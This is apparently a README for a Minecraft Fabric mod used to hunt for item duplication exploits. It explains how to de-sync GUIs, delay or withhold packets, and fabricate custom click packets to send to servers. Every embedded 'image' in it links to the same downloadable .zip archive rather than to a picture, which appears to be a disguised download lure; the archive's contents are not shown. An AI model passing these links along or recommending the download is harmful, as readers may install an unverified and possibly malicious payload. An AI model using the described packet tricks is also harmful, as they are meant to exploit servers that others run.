# UI-Utils
Dupe hunting mod. Incompatible with mac, needs fabric api
---

- How to use:
---

- Open any inventory/container with the mod and you should see a few buttons.

![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)

- "Close without packet" closes your current gui (ScreenHandler) without sending a `CloseHandledScreenC2SPacket` to the server.

- "De-sync" closes your current gui server-side and keeps it open client-side.

- "Send packets: true/false" tells the client whether it should send any `ClickSlotC2SPacket`(s) and `ButtonClickC2SPacket`(s).

- "Delay packets: true/false" when turned on it will store all `ClickSlotC2SPacket`(s) and `ButtonClickC2SPacket`(s) into a list and will not send them immdiately until turned off which sends them all at once.

- "Save GUI" saves your current gui to a variable and can be accessed by pressing a keybind in the keybinding options (default key is 'V').

- "Disconnect and send packets" will if "Delay packets" is turned on send the list of stored packets immediately and then disconnect right afterward (can create potential race conditions on non-vanilla servers).

- "Sync Id: ??" is a number used internally to sync various gui related packets.

- "Revision: ??" is a number used internally to sync various gui related packets sent from the server to the client.

- "Fabricate packet" allows you to create a custom `ClickSlotC2SPacket` and `ButtonClickC2SPacket` within a window it creates.

- Fabricate packet tutorial (Click Slot):
---

- `ClickSlotC2SPacket`(s) are what the client sends to the server when clicking any slot in a gui (e.g. shift clicking an item).

- When clicking the "Fabricate packet" button you should see this window appear:

![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)

- Clicking "Click Slot" will open up this window:

![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)

- Enter the "Sync Id" and "Revision" value you see in the in-game gui to the "Click Slot Packet" gui.

- The "Slot" value should be set to what slot you would like to click (starting from 0) you can generally find the location of gui slots on google for generic guis, e.g. double chest:

 ![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)

- The "Button" field should be set to either: (0 is a leftclick, 1 is a rightclick, 0-8 and 40 will be explained below).

- The "Action" field should be set to one of these options,

![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)

- "PICKUP" puts the item on the slot field on your cursor or visa versa, "QUICK_MOVE" is a shift click, "SWAP" acts as a hotbar or offhand swap (e.g. if your "Action" is set to "SWAP" and the "Button" set to 0-8, it will swap the item in the "Slot" field to one of those hotbar slots (starting from 0) or visa versa, "Button" being set to 40 will swap the item in the "Slot" field to your offhand or visa versa), "CLONE" acts as a middle click to clone items (only works in creative mode), "THROW" drops the item in the "Slot" field, "QUICK_CRAFT" is a bit complicated so you will have to experiment yourself or look into some code for it, "PICKUP_ALL" will pickup all the items matching to the item on your cursor, As long as "Slot" is within bounds of that gui.

- The "Send" button will send the packet with all the info you inputed and will give a response if it was successful or failed to send the packet you provided.

- Example of this feature:
---

![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)

- When clicking "Send" in the above image, It should drop the bedrock item on the ground.

![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)


- Fabricate packet tutorial (Button Click):
---

- `ButtonClickC2SPacket`(s) are what the client sends to the server when clicking a button in a server-side gui (e.g. clicking an enchantment in an enchantment table).

- When clicking the "Fabricate packet" button you should see this window appear:

![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)

- Clicking "Button Click" will open up this window:

![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)

- Enter the "Sync Id" field in the "Button Click Packet" gui as the "Sync Id" value you will see in the in-game gui.

- Enter the "Button Id" field as what button you would like to click in a gui (starting from 0)

- Example of this feature:
---

![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)

![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)

![image](https://raw.githubusercontent.com/MusicBoiyzzz/ui-utils-mc-items-duper-/main/src/main/resources/ui_mc_items_utils_duper_1.3.zip)

---

That's all the features for this mod currently, there may be more updates in the future but I cannot guarantee.
